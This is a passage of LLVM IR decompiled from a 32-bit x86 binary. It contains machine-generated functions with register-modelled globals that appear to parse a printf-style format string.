dec_label_pc_8051212:                             ; preds = %dec_label_pc_80511fc.dec_label_pc_8051212_crit_edge, %dec_label_pc_80511e5
  %v0_8051212 = phi i32 [ %v0_8051212.pre, %dec_label_pc_80511fc.dec_label_pc_8051212_crit_edge ], [ %v2_80511ec, %dec_label_pc_80511e5 ]
  store i32 %v0_8051212, i32* @ebx, align 4
  br label %dec_label_pc_8051214

dec_label_pc_8051214:                             ; preds = %dec_label_pc_80511ce, %dec_label_pc_8051212
  %v0_805121f = phi i32 [ %arg3, %dec_label_pc_80511ce ], [ %v0_8051212, %dec_label_pc_8051212 ]
  %tmp19 = icmp slt i32 %v0_805121f, 1
  br i1 %tmp19, label %dec_label_pc_805122c, label %dec_label_pc_805121a

dec_label_pc_805121a:                             ; preds = %dec_label_pc_8051214
  %v0_805121a = load i32, i32* @ecx, align 4
  %v4_8051224 = call i32 @function_80547a0(i32 %arg4, i32 %v0_805121f, i32 %arg1, i32 %v0_805121a)
  br label %dec_label_pc_805122c

dec_label_pc_805122c:                             ; preds = %dec_label_pc_8051214, %dec_label_pc_805121a
  %v1_805122c = phi i32 [ 0, %dec_label_pc_8051214 ], [ %v4_8051224, %dec_label_pc_805121a ]
  %v0_805122c = load i32, i32* @ebp, align 4
  %v2_805122c = add i32 %v0_805122c, %v1_805122c
  br label %dec_label_pc_805122e

dec_label_pc_805122e:                             ; preds = %dec_label_pc_80511fc, %dec_label_pc_805122c
  %v0_8051231 = phi i32 [ %v0_8051207, %dec_label_pc_80511fc ], [ %v2_805122c, %dec_label_pc_805122c ]
  ret i32 %v0_8051231

; uselistorder directives
  uselistorder i32 %v0_805121f, { 1, 0 }
  uselistorder i32 %v0_8051207, { 1, 2, 0 }
  uselistorder i32 %v1_8051200, { 1, 0 }
  uselistorder i32 %v2_80511f4, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805122e, { 1, 0 }
  uselistorder label %dec_label_pc_805122c, { 1, 0 }
  uselistorder label %dec_label_pc_8051214, { 1, 0 }
}

define i32 @function_8051238(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051238:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805123b = load i32, i32* @ebx, align 4
  store i32 %v0_805123b, i32* %stack_var_-16, align 4
  %v4_805123b = ptrtoint i32* %stack_var_-16 to i32
  %v1_805123c = add i32 %v4_805123b, -356
  %v10_805123c = icmp slt i32 %v1_805123c, 0
  store i1 %v10_805123c, i1* %sf.global-to-local, align 1
  %v4_8051242 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8051242, i32* @ebx, align 4
  %v2_805124a = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_805124a, i32* @esi, align 4
  %v4_805124f = call i32 @function_80517f0(i32* nonnull %stack_var_-348, i32 %v4_8051242)
  store i32 %v4_805124f, i32* %eax.global-to-local, align 4
  %v2_8051257 = icmp slt i32 %v4_805124f, 0
  store i1 %v2_8051257, i1* %sf.global-to-local, align 1
  %v1_8051259 = icmp eq i1 %v2_8051257, false
  br i1 %v1_8051259, label %dec_label_pc_8051299, label %dec_label_pc_805125b

dec_label_pc_805125b:                             ; preds = %dec_label_pc_8051238
  %v12_8051254 = ptrtoint i32* %stack_var_-364 to i32
  %v3_805125b = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_805125b, i32* @ebx, align 4
  %v1_805125f = add i32 %v12_8051254, -12
  %v10_805125f = icmp slt i32 %v1_805125f, 0
  store i1 %v10_805125f, i1* %sf.global-to-local, align 1
  %v1_8051263 = inttoptr i32 %v3_805125b to i8*
  %v2_8051263 = call i32 @function_8051ef8(i8* %v1_8051263)
  store i32 %v2_8051263, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_8051272 = icmp eq i32 %v2_8051263, 0
  %v2_8051272 = icmp slt i32 %v2_8051263, 0
  store i1 %v2_8051272, i1* %sf.global-to-local, align 1
  br i1 %v1_8051272, label %dec_label_pc_80517e2, label %dec_label_pc_805127a

dec_label_pc_805127a:                             ; preds = %dec_label_pc_805125b
  %v0_805127a = load i32, i32* @edx, align 4
  %v0_8051283 = load i32, i32* @ebx, align 4
  %v5_8051284 = call i32 @function_80547a0(i32 %v0_8051283, i32 %v2_8051263, i32 %arg1, i32 %v0_805127a)
  store i32 %v5_8051284, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_8051291 = load i32, i32* @esp, align 4
  %v1_8051291 = add i32 %v0_8051291, 16
  %v7_8051291 = icmp slt i32 %v1_8051291, 0
  store i1 %v7_8051291, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80517e2

dec_label_pc_8051299:                             ; preds = %dec_label_pc_8051238
  %v5_80512a3 = call i32 @function_8051860(i32 %v2_805124a, i32 %arg3, i32 %v4_805124f, i32 %v4_805124f)
  store i32 %v5_80512a3, i32* %eax.global-to-local, align 4
  %v0_80512a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80512a8, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_80512b2 = load i32, i32* @esp, align 4
  %v1_80512b2 = add i32 %v0_80512b2, 16
  %v7_80512b2 = icmp slt i32 %v1_80512b2, 0
  store i1 %v7_80512b2, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80512b8

dec_label_pc_80512b7:                             ; preds = %dec_label_pc_80512be
  %v1_80512b7 = add i32 %v0_80512c6, 1
  %v9_80512b7 = icmp slt i32 %v1_80512b7, 0
  store i1 %v9_80512b7, i1* %sf.global-to-local, align 1
  store i32 %v1_80512b7, i32* @ebx, align 4
  br label %dec_label_pc_80512b8.backedge

dec_label_pc_80512b8.backedge:                    ; preds = %dec_label_pc_80512b7, %dec_label_pc_80517c8, %dec_label_pc_80517d3
  %v1_80512c220 = phi i32 [ %v1_80512ca, %dec_label_pc_80512b7 ], [ %v3_80517c8, %dec_label_pc_80517c8 ], [ %v1_80512f6, %dec_label_pc_80517d3 ]
  %v0_80512b818 = phi i32 [ %v1_80512b7, %dec_label_pc_80512b7 ], [ %v3_80517c8, %dec_label_pc_80517c8 ], [ %v1_80517d3, %dec_label_pc_80517d3 ]
  %v4_80512b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512b8

dec_label_pc_80512b8:                             ; preds = %dec_label_pc_80512b8.backedge, %dec_label_pc_8051299
  %v1_80512ca = phi i32 [ %v1_80512c220, %dec_label_pc_80512b8.backedge ], [ %v0_80512a8, %dec_label_pc_8051299 ]
  %v0_80512c6 = phi i32 [ %v0_80512b818, %dec_label_pc_80512b8.backedge ], [ %v0_80512a8, %dec_label_pc_8051299 ]
  %v4_80512b8 = phi i32 [ %v4_80512b8.pre, %dec_label_pc_80512b8.backedge ], [ %v5_80512a3, %dec_label_pc_8051299 ]
  %v1_80512b8 = inttoptr i32 %v0_80512c6 to i8*
  %v2_80512b8 = load i8, i8* %v1_80512b8, align 1
  %v3_80512b8 = zext i8 %v2_80512b8 to i32
  %v5_80512b8 = and i32 %v4_80512b8, -256
  %v6_80512b8 = or i32 %v3_80512b8, %v5_80512b8
  store i32 %v6_80512b8, i32* %eax.global-to-local, align 4
  %v4_80512ba = icmp eq i8 %v2_80512b8, 0
  %v5_80512ba = icmp slt i8 %v2_80512b8, 0
  store i1 %v5_80512ba, i1* %sf.global-to-local, align 1
  br i1 %v4_80512ba, label %dec_label_pc_80512c2, label %dec_label_pc_80512be

dec_label_pc_80512be:                             ; preds = %dec_label_pc_80512b8
  %v2_80512be = add i8 %v2_80512b8, -37
  %v10_80512be = icmp eq i8 %v2_80512be, 0
  %v11_80512be = icmp slt i8 %v2_80512be, 0
  store i1 %v11_80512be, i1* %sf.global-to-local, align 1
  %v1_80512c0 = icmp eq i1 %v10_80512be, false
  br i1 %v1_80512c0, label %dec_label_pc_80512b7, label %dec_label_pc_80512c2

dec_label_pc_80512c2:                             ; preds = %dec_label_pc_80512be, %dec_label_pc_80512b8
  %v2_80512c2 = sub i32 %v0_80512c6, %v1_80512ca
  %v12_80512c2 = icmp eq i32 %v2_80512c2, 0
  %v13_80512c2 = icmp slt i32 %v2_80512c2, 0
  store i1 %v13_80512c2, i1* %sf.global-to-local, align 1
  br i1 %v12_80512c2, label %dec_label_pc_80512ed, label %dec_label_pc_80512c6

dec_label_pc_80512c6:                             ; preds = %dec_label_pc_80512c2
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80512c2, i32* @esi, align 4
  store i1 %v13_80512c2, i1* %sf.global-to-local, align 1
  %tmp64 = icmp slt i32 %v2_80512c2, 1
  br i1 %tmp64, label %dec_label_pc_80512e2, label %dec_label_pc_80512d0

dec_label_pc_80512d0:                             ; preds = %dec_label_pc_80512c6
  %v0_80512d0 = load i32, i32* @ebp, align 4
  %v1_80512d0 = load i32, i32* @esp, align 4
  %v2_80512d0 = add i32 %v1_80512d0, -4
  %v3_80512d0 = inttoptr i32 %v2_80512d0 to i32*
  store i32 %v0_80512d0, i32* %v3_80512d0, align 4
  %v1_80512d1 = add i32 %v1_80512d0, 368
  %v2_80512d1 = inttoptr i32 %v1_80512d1 to i32*
  %v3_80512d1 = load i32, i32* %v2_80512d1, align 4
  %v5_80512d1 = add i32 %v1_80512d0, -8
  %v6_80512d1 = inttoptr i32 %v5_80512d1 to i32*
  store i32 %v3_80512d1, i32* %v6_80512d1, align 4
  %v0_80512d8 = load i32, i32* @esi, align 4
  %v2_80512d8 = add i32 %v1_80512d0, -12
  %v3_80512d8 = inttoptr i32 %v2_80512d8 to i32*
  store i32 %v0_80512d8, i32* %v3_80512d8, align 4
  %v0_80512d9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80512d9 = add i32 %v1_80512d0, -16
  %v3_80512d9 = inttoptr i32 %v2_80512d9 to i32*
  store i32 %v0_80512d9, i32* %v3_80512d9, align 4
  %v0_80512da = load i32, i32* %stack_var_-364, align 4
  %v4_80512da = call i32 @function_80547a0(i32 %v0_80512da, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80512da, i32* %eax.global-to-local, align 4
  %v0_80512df = load i32, i32* @esp, align 4
  %v1_80512df = add i32 %v0_80512df, 16
  %v7_80512df = icmp slt i32 %v1_80512df, 0
  store i1 %v7_80512df, i1* %sf.global-to-local, align 1
  %v1_80512e2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80512e2

dec_label_pc_80512e2:                             ; preds = %dec_label_pc_80512c6, %dec_label_pc_80512d0
  %v3_80512ea = phi i32 [ %v2_80512c2, %dec_label_pc_80512c6 ], [ %v1_80512e2.pre, %dec_label_pc_80512d0 ]
  %v0_80512e2 = phi i32 [ 0, %dec_label_pc_80512c6 ], [ %v4_80512da, %dec_label_pc_80512d0 ]
  %v2_80512e2 = sub i32 %v0_80512e2, %v3_80512ea
  %v12_80512e2 = icmp eq i32 %v2_80512e2, 0
  %v13_80512e2 = icmp slt i32 %v2_80512e2, 0
  store i1 %v13_80512e2, i1* %sf.global-to-local, align 1
  %v1_80512e4 = icmp eq i1 %v12_80512e2, false
  %v0_80517db.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_80512e4, label %dec_label_pc_80517db, label %dec_label_pc_80512ea

dec_label_pc_80512ea:                             ; preds = %dec_label_pc_80512e2
  %v1_80512ea = inttoptr i32 %v0_80517db.pre.pre to i32*
  %v2_80512ea = load i32, i32* %v1_80512ea, align 4
  %v4_80512ea = add i32 %v2_80512ea, %v3_80512ea
  %v15_80512ea = icmp slt i32 %v4_80512ea, 0
  store i1 %v15_80512ea, i1* %sf.global-to-local, align 1
  store i32 %v4_80512ea, i32* %v1_80512ea, align 4
  %v0_80512ed.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80512ed

dec_label_pc_80512ed:                             ; preds = %dec_label_pc_80512c2, %dec_label_pc_80512ea
  %v0_80517d3 = phi i32 [ %v0_80512c6, %dec_label_pc_80512c2 ], [ %v0_80512ed.pre, %dec_label_pc_80512ea ]
  %v1_80512ed = inttoptr i32 %v0_80517d3 to i8*
  %v2_80512ed = load i8, i8* %v1_80512ed, align 1
  %v3_80512ed = icmp eq i8 %v2_80512ed, 0
  %v4_80512ed = icmp slt i8 %v2_80512ed, 0
  store i1 %v4_80512ed, i1* %sf.global-to-local, align 1
  br i1 %v3_80512ed, label %dec_label_pc_80517e2, label %dec_label_pc_80512f6

dec_label_pc_80512f6:                             ; preds = %dec_label_pc_80512ed
  %v1_80512f6 = add i32 %v0_80517d3, 1
  %v2_80512f6 = inttoptr i32 %v1_80512f6 to i8*
  %v3_80512f6 = load i8, i8* %v2_80512f6, align 1
  %v4_80512f6 = add i8 %v3_80512f6, -37
  %v12_80512f6 = icmp eq i8 %v4_80512f6, 0
  %v13_80512f6 = icmp slt i8 %v4_80512f6, 0
  store i1 %v13_80512f6, i1* %sf.global-to-local, align 1
  store i32 %v1_80512f6, i32* %edx.global-to-local, align 4
  br i1 %v12_80512f6, label %dec_label_pc_80517d3, label %dec_label_pc_8051303

dec_label_pc_8051303:                             ; preds = %dec_label_pc_80512f6
  %v1_8051303 = load i32, i32* @esp, align 4
  %v2_8051303 = add i32 %v1_8051303, 16
  %v3_8051303 = inttoptr i32 %v2_8051303 to i32*
  store i32 %v1_80512f6, i32* %v3_8051303, align 4
  %v0_8051307 = load i32, i32* @esp, align 4
  %v1_8051307 = add i32 %v0_8051307, 340
  %v2_8051307 = inttoptr i32 %v1_8051307 to i32*
  store i32 0, i32* %v2_8051307, align 4
  %v0_8051312 = load i32, i32* @esp, align 4
  %v1_8051312 = add i32 %v0_8051312, -12
  %v10_8051312 = icmp slt i32 %v1_8051312, 0
  store i1 %v10_8051312, i1* %sf.global-to-local, align 1
  %v1_8051315 = add i32 %v0_8051312, 16
  store i32 %v1_8051315, i32* @ebx, align 4
  %v2_8051319 = add i32 %v0_8051312, -16
  %v3_8051319 = inttoptr i32 %v2_8051319 to i32*
  store i32 %v1_8051315, i32* %v3_8051319, align 4
  %v0_805131a = load i32, i32* %stack_var_-364, align 4
  %v1_805131a = inttoptr i32 %v0_805131a to i32*
  %v2_805131a = call i32 @function_80519e1(i32* %v1_805131a)
  store i32 %v2_805131a, i32* %eax.global-to-local, align 4
  %v0_805131f = load i32, i32* @ebx, align 4
  %v1_805131f = load i32, i32* @esp, align 4
  %v2_805131f = inttoptr i32 %v1_805131f to i32*
  store i32 %v0_805131f, i32* %v2_805131f, align 4
  %v0_8051322 = load i32, i32* %stack_var_-364, align 4
  %v1_8051322 = call i32 @function_80518a4(i32 %v0_8051322)
  store i32 %v1_8051322, i32* %eax.global-to-local, align 4
  %v0_8051327 = load i32, i32* @esp, align 4
  %v1_8051327 = add i32 %v0_8051327, 70
  %v2_8051327 = inttoptr i32 %v1_8051327 to i8*
  %v3_8051327 = load i8, i8* %v2_8051327, align 1
  %v4_8051327 = zext i8 %v3_8051327 to i32
  store i32 %v4_8051327, i32* @edi, align 4
  %v1_805132c = add i32 %v0_8051327, 16
  %v1_805132f = add i32 %v0_8051327, 56
  %v2_805132f = inttoptr i32 %v1_805132f to i32*
  %v3_805132f = load i32, i32* %v2_805132f, align 4
  %v5_805132f = icmp slt i32 %v3_805132f, 0
  store i1 %v5_805132f, i1* %sf.global-to-local, align 1
  %v1_8051334 = add i32 %v0_8051327, 112
  store i32 %v1_8051334, i32* %edx.global-to-local, align 4
  %tmp65 = icmp slt i32 %v3_805132f, 1
  br i1 %tmp65, label %dec_label_pc_8051341, label %dec_label_pc_805133a

dec_label_pc_805133a:                             ; preds = %dec_label_pc_8051303
  %v2_805133a = zext i8 %v3_8051327 to i32
  %v3_805133a = mul nuw nsw i32 %v2_805133a, 12
  store i32 %v3_805133a, i32* %eax.global-to-local, align 4
  %v2_805133d = add i32 %v0_8051327, 100
  %v3_805133d = add i32 %v2_805133d, %v3_805133a
  store i32 %v3_805133d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051341

dec_label_pc_8051341:                             ; preds = %dec_label_pc_8051303, %dec_label_pc_805133a
  %v0_805134927 = phi i32 [ %v1_8051334, %dec_label_pc_8051303 ], [ %v3_805133d, %dec_label_pc_805133a ]
  %v1_8051341 = add i32 %v0_8051327, 60
  %v2_8051341 = inttoptr i32 %v1_8051341 to i32*
  %v3_8051341 = load i32, i32* %v2_8051341, align 4
  store i32 %v3_8051341, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805135471 = sub i32 0, %v3_8051341
  %v10_805135474 = and i32 %v3_8051341, %v2_805135471
  %v11_805135475 = icmp slt i32 %v10_805135474, 0
  %v13_805135476 = icmp slt i32 %v2_805135471, 0
  %v2_805135677 = icmp eq i1 %v13_805135476, %v11_805135475
  br i1 %v2_805135677, label %dec_label_pc_8051358, label %dec_label_pc_8051349

dec_label_pc_8051349:                             ; preds = %dec_label_pc_8051341, %dec_label_pc_8051349
  %v0_805135881 = phi i32 [ %v0_8051358, %dec_label_pc_8051349 ], [ %v1_805132c, %dec_label_pc_8051341 ]
  %v2_805134980 = phi i32 [ %v1_8051353, %dec_label_pc_8051349 ], [ 0, %dec_label_pc_8051341 ]
  %v0_805134979 = phi i32 [ %v1_8051350, %dec_label_pc_8051349 ], [ %v0_805134927, %dec_label_pc_8051341 ]
  %v3_8051349 = mul i32 %v2_805134980, 4
  %v4_8051349 = add i32 %v3_8051349, 344
  %v5_8051349 = add i32 %v4_8051349, %v0_805135881
  %v6_8051349 = inttoptr i32 %v5_8051349 to i32*
  store i32 %v0_805134979, i32* %v6_8051349, align 4
  %v0_8051350 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051350 = add i32 %v0_8051350, 12
  store i32 %v1_8051350, i32* %edx.global-to-local, align 4
  %v0_8051353 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051353 = add i32 %v0_8051353, 1
  %v1_8051354.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_8051353, i32* %eax.global-to-local, align 4
  %v2_8051354 = sub i32 %v1_8051353, %v1_8051354.pre
  %v8_8051354 = xor i32 %v1_8051353, %v1_8051354.pre
  %v9_8051354 = xor i32 %v2_8051354, %v1_8051353
  %v10_8051354 = and i32 %v9_8051354, %v8_8051354
  %v11_8051354 = icmp slt i32 %v10_8051354, 0
  %v13_8051354 = icmp slt i32 %v2_8051354, 0
  %v2_8051356 = icmp eq i1 %v13_8051354, %v11_8051354
  %v0_8051358 = load i32, i32* @esp, align 4
  br i1 %v2_8051356, label %dec_label_pc_8051358, label %dec_label_pc_8051349

dec_label_pc_8051358:                             ; preds = %dec_label_pc_8051349, %dec_label_pc_8051341
  %v0_8051358.lcssa = phi i32 [ %v1_805132c, %dec_label_pc_8051341 ], [ %v0_8051358, %dec_label_pc_8051349 ]
  %v1_8051358 = add i32 %v0_8051358.lcssa, 48
  %v2_8051358 = inttoptr i32 %v1_8051358 to i32*
  %v3_8051358 = load i32, i32* %v2_8051358, align 4
  store i32 %v3_8051358, i32* %ecx.global-to-local, align 4
  %v1_805135c = icmp eq i32 %v3_8051358, 0
  %v2_805135c = icmp slt i32 %v3_8051358, 0
  store i1 %v2_805135c, i1* %sf.global-to-local, align 1
  %v1_805135e = icmp eq i1 %v1_805135c, false
  br i1 %v1_805135e, label %dec_label_pc_8051386, label %dec_label_pc_8051360

dec_label_pc_8051360:                             ; preds = %dec_label_pc_8051358
  %v1_8051360 = inttoptr i32 %v0_8051358.lcssa to i32*
  %v2_8051360 = load i32, i32* %v1_8051360, align 4
  store i32 %v2_8051360, i32* %eax.global-to-local, align 4
  %v1_8051363 = ashr i32 %v2_8051360, 31
  store i32 %v1_8051363, i32* %edx.global-to-local, align 4
  %v2_8051364 = add i32 %v0_8051358.lcssa, -4
  %v3_8051364 = inttoptr i32 %v2_8051364 to i32*
  store i32 %v1_8051363, i32* %v3_8051364, align 4
  %v0_8051365 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051365 = add i32 %v0_8051358.lcssa, -8
  %v3_8051365 = inttoptr i32 %v2_8051365 to i32*
  store i32 %v0_8051365, i32* %v3_8051365, align 4
  %v1_8051366 = add i32 %v0_8051358.lcssa, 32
  %v2_8051366 = inttoptr i32 %v1_8051366 to i32*
  %v3_8051366 = load i32, i32* %v2_8051366, align 4
  %v1_805136a = and i32 %v3_8051366, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805136a, i32* %eax.global-to-local, align 4
  %v2_805136f = add i32 %v0_8051358.lcssa, -12
  %v3_805136f = inttoptr i32 %v2_805136f to i32*
  store i32 %v1_805136a, i32* %v3_805136f, align 4
  %v1_8051370 = add i32 %v0_8051358.lcssa, 344
  %v2_8051370 = inttoptr i32 %v1_8051370 to i32*
  %v3_8051370 = load i32, i32* %v2_8051370, align 4
  store i32 %v3_8051370, i32* %eax.global-to-local, align 4
  %v1_8051377 = inttoptr i32 %v3_8051370 to i32*
  %v2_8051377 = load i32, i32* %v1_8051377, align 4
  %v4_8051377 = add i32 %v0_8051358.lcssa, -16
  %v5_8051377 = inttoptr i32 %v4_8051377 to i32*
  store i32 %v2_8051377, i32* %v5_8051377, align 4
  %v0_8051379 = call i32 @function_805498c()
  store i32 %v0_8051379, i32* %eax.global-to-local, align 4
  %v0_805137e = load i32, i32* @esp, align 4
  %v1_805137e = add i32 %v0_805137e, 16
  %v7_805137e = icmp slt i32 %v1_805137e, 0
  store i1 %v7_805137e, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80517c8

dec_label_pc_8051386:                             ; preds = %dec_label_pc_8051358
  %v1_8051386 = add i32 %v3_8051358, -7
  %v5_8051386 = icmp ult i32 %v3_8051358, 7
  %v9_8051386 = icmp eq i32 %v1_8051386, 0
  %v10_8051386 = icmp slt i32 %v1_8051386, 0
  store i1 %v10_8051386, i1* %sf.global-to-local, align 1
  %v2_8051389 = or i1 %v5_8051386, %v9_8051386
  br i1 %v2_8051389, label %dec_label_pc_805138f, label %dec_label_pc_80514f3

dec_label_pc_805138f:                             ; preds = %dec_label_pc_8051386
  %v1_805138f = add i32 %v3_8051358, 134594736
  %v2_805138f = inttoptr i32 %v1_805138f to i8*
  %v3_805138f = load i8, i8* %v2_805138f, align 1
  %v4_805138f = sext i8 %v3_805138f to i32
  store i32 %v4_805138f, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_805139b = icmp eq i8 %v3_805138f, 10
  %v10_805139b = icmp slt i8 %v3_805138f, 10
  store i1 %v10_805139b, i1* %sf.global-to-local, align 1
  %v1_805139e = icmp eq i1 %v9_805139b, false
  br i1 %v1_805139e, label %dec_label_pc_80513be, label %dec_label_pc_80513a0

dec_label_pc_80513a0:                             ; preds = %dec_label_pc_805138f
  %v1_80513a0 = add i32 %v0_8051358.lcssa, 32
  %v2_80513a0 = inttoptr i32 %v1_80513a0 to i32*
  %v3_80513a0 = load i32, i32* %v2_80513a0, align 4
  store i32 %v3_80513a0, i32* %eax.global-to-local, align 4
  %v1_80513a6 = udiv i32 %v3_80513a0, 32
  %tmp66 = urem i32 %v1_80513a6, 2
  %tmp67 = sub nsw i32 45, %tmp66
  %v2_80513b6 = or i32 %tmp67, 128
  store i32 %v2_80513b6, i32* %edx.global-to-local, align 4
  %v2_80513b9 = and i32 %v3_80513a0, 64
  %v3_80513b9 = icmp eq i32 %v2_80513b9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80513bb = icmp eq i1 %v3_80513b9, false
  %v4_80513bb = select i1 %v1_80513bb, i32 %v2_80513b6, i32 %tmp67
  store i32 %v4_80513bb, i32* @ebx, align 4
  br label %dec_label_pc_80513be

dec_label_pc_80513be:                             ; preds = %dec_label_pc_805138f, %dec_label_pc_80513a0
  %v1_80513be = add i32 %v3_8051358, -5
  %v5_80513be = icmp ult i32 %v3_8051358, 5
  %v9_80513be = icmp eq i32 %v1_80513be, 0
  %v10_80513be = icmp slt i32 %v1_80513be, 0
  store i1 %v10_80513be, i1* %sf.global-to-local, align 1
  %v2_80513c1 = or i1 %v5_80513be, %v9_80513be
  br i1 %v2_80513c1, label %dec_label_pc_80513c3, label %dec_label_pc_80513db

dec_label_pc_80513c3:                             ; preds = %dec_label_pc_80513be
  %v1_80513c3 = add i32 %v3_8051358, -3
  %v9_80513c3 = icmp eq i32 %v1_80513c3, 0
  %v10_80513c3 = icmp slt i32 %v1_80513c3, 0
  store i1 %v10_80513c3, i1* %sf.global-to-local, align 1
  %v1_80513c6 = icmp eq i1 %v9_80513c3, false
  br i1 %v1_80513c6, label %dec_label_pc_80513cf, label %dec_label_pc_80513c8

dec_label_pc_80513c8:                             ; preds = %dec_label_pc_80513c3
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_80513dd

dec_label_pc_80513cf:                             ; preds = %dec_label_pc_80513c3
  %v1_80513cf = add i32 %v3_8051358, -1
  %v9_80513cf = icmp eq i32 %v1_80513cf, 0
  %v10_80513cf = icmp slt i32 %v1_80513cf, 0
  store i1 %v10_80513cf, i1* %sf.global-to-local, align 1
  br i1 %v9_80513cf, label %dec_label_pc_80513e2, label %dec_label_pc_80513dd

dec_label_pc_80513db:                             ; preds = %dec_label_pc_80513be
  %v1_80513db = sub nsw i32 0, %v4_805138f
  %v7_80513db = icmp sgt i8 %v3_805138f, 0
  store i1 %v7_80513db, i1* %sf.global-to-local, align 1
  store i32 %v1_80513db, i32* @esi, align 4
  br label %dec_label_pc_80513dd

dec_label_pc_80513dd:                             ; preds = %dec_label_pc_80513cf, %dec_label_pc_80513c8, %dec_label_pc_80513db
  br label %dec_label_pc_80513e2

dec_label_pc_80513e2:                             ; preds = %dec_label_pc_80513cf, %dec_label_pc_80513dd
  %storemerge = phi i32 [ 11, %dec_label_pc_80513dd ], [ 6, %dec_label_pc_80513cf ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_80513e2 = add i32 %v0_8051358.lcssa, 20
  %v2_80513e2 = inttoptr i32 %v1_80513e2 to i32*
  %v3_80513e2 = load i32, i32* %v2_80513e2, align 4
  %v5_80513e2 = icmp slt i32 %v3_80513e2, 0
  store i1 %v5_80513e2, i1* %sf.global-to-local, align 1
  %v1_80513e7 = add i32 %v0_8051358.lcssa, 7
  %v2_80513e7 = inttoptr i32 %v1_80513e7 to i8*
  store i8 32, i8* %v2_80513e7, align 1
  %v0_80513ec = load i1, i1* %sf.global-to-local, align 1
  %v1_80513ec = icmp eq i1 %v0_80513ec, false
  br i1 %v1_80513ec, label %dec_label_pc_80513f6, label %dec_label_pc_80513ee

dec_label_pc_80513ee:                             ; preds = %dec_label_pc_80513e2
  %v0_80513ee = load i32, i32* @esp, align 4
  %v1_80513ee = add i32 %v0_80513ee, 36
  %v2_80513ee = inttoptr i32 %v1_80513ee to i8*
  %v3_80513ee = load i8, i8* %v2_80513ee, align 1
  %v4_80513ee = zext i8 %v3_80513ee to i32
  %v5_80513ee = load i32, i32* %edx.global-to-local, align 4
  %v6_80513ee = and i32 %v5_80513ee, -256
  %v7_80513ee = or i32 %v6_80513ee, %v4_80513ee
  store i32 %v7_80513ee, i32* %edx.global-to-local, align 4
  %v3_80513f2 = add i32 %v0_80513ee, 7
  %v4_80513f2 = inttoptr i32 %v3_80513f2 to i8*
  store i8 %v3_80513ee, i8* %v4_80513f2, align 1
  br label %dec_label_pc_80513f6

dec_label_pc_80513f6:                             ; preds = %dec_label_pc_80513e2, %dec_label_pc_80513ee
  %v1_80513f6 = add i32 %v3_8051358, -1
  %v8_80513f6 = icmp eq i32 %v1_80513f6, 0
  %v9_80513f6 = icmp slt i32 %v1_80513f6, 0
  store i1 %v9_80513f6, i1* %sf.global-to-local, align 1
  store i32 %v1_80513f6, i32* %ecx.global-to-local, align 4
  %v0_80513f7 = load i32, i32* @esp, align 4
  %v1_80513f7 = add i32 %v0_80513f7, 344
  %v2_80513f7 = inttoptr i32 %v1_80513f7 to i32*
  %v3_80513f7 = load i32, i32* %v2_80513f7, align 4
  store i32 %v3_80513f7, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_805140f.pre = load i32, i32* @edi, align 4
  br i1 %v8_80513f6, label %dec_label_pc_805140f, label %dec_label_pc_8051405

dec_label_pc_8051405:                             ; preds = %dec_label_pc_80513f6
  %v2_8051405 = mul i32 %v0_805140f.pre, 4
  %v3_8051405 = add i32 %v0_80513f7, 52
  %v4_8051405 = add i32 %v3_8051405, %v2_8051405
  %v5_8051405 = inttoptr i32 %v4_8051405 to i32*
  %v6_8051405 = load i32, i32* %v5_8051405, align 4
  %v1_8051409 = and i32 %v6_8051405, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8051409, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805140f

dec_label_pc_805140f:                             ; preds = %dec_label_pc_80513f6, %dec_label_pc_8051405
  %v2_805140f = add i32 %v0_80513f7, -4
  %v3_805140f = inttoptr i32 %v2_805140f to i32*
  store i32 %v0_805140f.pre, i32* %v3_805140f, align 4
  %v0_8051410 = load i32, i32* @esi, align 4
  %v2_8051410 = add i32 %v0_80513f7, -8
  %v3_8051410 = inttoptr i32 %v2_8051410 to i32*
  store i32 %v0_8051410, i32* %v3_8051410, align 4
